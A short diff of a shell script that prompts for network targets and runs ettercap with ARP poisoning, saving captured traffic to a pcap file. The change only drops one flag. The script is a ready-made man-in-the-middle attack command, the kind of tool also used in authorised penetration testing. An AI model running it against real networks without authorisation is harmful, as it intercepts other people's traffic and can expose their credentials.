@@ -16,7 +16,7 @@ then
 	read -p 'Target 1 IP: ' routervar
 	echo Enter Target 2 IP - if required
 	read -p 'Target 2 IP: ' targetvar
-	ettercap -T -i $intervar -M ARP -d -w /root/etterlog/$filevar.pcap /$routervar//$targetvar/ output:
+	ettercap -T -i $intervar -M ARP -w /root/etterlog/$filevar.pcap /$routervar//$targetvar/ output:
 else
     echo ettercap cancelled
 echo finished
